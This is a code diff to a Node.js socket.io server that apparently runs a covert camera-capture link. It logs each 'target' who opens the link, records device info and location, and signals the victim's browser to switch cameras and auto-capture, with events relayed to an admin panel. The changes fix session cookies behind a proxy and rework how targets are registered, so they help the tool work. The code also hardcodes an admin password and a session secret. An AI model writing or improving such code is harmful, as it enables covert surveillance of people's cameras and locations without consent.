@@ -9,6 +9,9 @@ const { Server } = require("socket.io");
 const app = express();
 const server = http.createServer(app);
 
+// CRITICAL FIX FOR RENDER/PROXIES (Ensures session & cookies work correctly)
+app.set("trust proxy", 1);
+
 const io = new Server(server, {
     maxHttpBufferSize: 3 * 1024 * 1024,
     pingTimeout: 20000,
@@ -16,7 +19,7 @@ const io = new Server(server, {
 });
 
 const PORT = process.env.PORT || 3000;
-const ADMIN_PASSWORD = "ayaz;;"; // Updated password
+const ADMIN_PASSWORD = "ayaz;;";
 const SESSION_SECRET = process.env.SESSION_SECRET || "AyazSecretSession2026";
 
 const MAX_USERS = 5;
@@ -161,7 +164,9 @@ app.post("/api/admin/login", (req, res) => {
         return res.status(401).json({ ok: false, error: "Wrong password." });
     }
     req.session.isAdmin = true;
-    res.json({ ok: true });
+    req.session.save(() => {
+        res.json({ ok: true });
+    });
 });
 
 app.post("/api/admin/logout", requireAdmin, (req, res) => {
@@ -267,7 +272,6 @@ io.on("connection", (socket) => {
         io.to(targetSocketId).emit("switch-camera");
     });
 
-    // Link open handling immediately upon connection/info receipt, independent of camera permission
     socket.on("user-connect-info", (data) => {
         if (!isLinkActive) {
             socket.emit("link-disabled");
@@ -317,43 +321,36 @@ io.on("connection", (socket) => {
             return;
         }
 
-        const target = connectedTargets.get(socket.id);
+        let target = connectedTargets.get(socket.id);
         if (!target) {
-            // Fallback if connect-info wasn't triggered first
             if (connectedTargets.size >= MAX_USERS) {
                 socket.emit("server-full", { maxUsers: MAX_USERS });
                 socket.disconnect(true);
                 return;
             }
-            const newTarget = {
+            target = {
                 id: socket.id,
                 deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
                 connectedAt: new Date().toLocaleString(),
                 location: null,
-                cameraReady: true,
+                cameraReady: false,
                 autoCaptureStarted: false
             };
-            connectedTargets.set(socket.id, newTarget);
+            connectedTargets.set(socket.id, target);
             socket.join("users");
             const timeStr = new Date().toISOString();
             addHistory({
                 event: "link-opened",
                 socketId: socket.id,
-                deviceInfo: newTarget.deviceInfo,
+                deviceInfo: target.deviceInfo,
                 time: timeStr
             });
-            emitUsersList();
             io.to("admins").emit("access-event", {
                 event: "link-opened",
                 socketId: socket.id,
-                deviceInfo: newTarget.deviceInfo,
+                deviceInfo: target.deviceInfo,
                 time: timeStr
             });
-            if (isAutoCaptureOn) {
-                newTarget.autoCaptureStarted = true;
-                socket.emit("start-auto-capture");
-            }
-            return;
         }
 
         target.cameraReady = true;
